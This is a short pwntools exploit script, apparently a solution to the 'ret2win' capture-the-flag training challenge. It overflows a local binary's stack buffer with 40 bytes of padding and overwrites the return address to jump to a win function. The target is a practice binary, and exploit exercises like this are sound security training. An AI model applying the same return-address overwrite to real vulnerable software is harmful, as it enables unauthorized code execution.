from pwn import *

padding = b'A'*40
add=p64(0x0000000000400757)

payload = padding+add

p = process("./ret2win")
print(p.recvuntil(b'> '))
print(p.sendline(payload))
print(p.recvline())
print(p.recvline())
print(p.recvline())

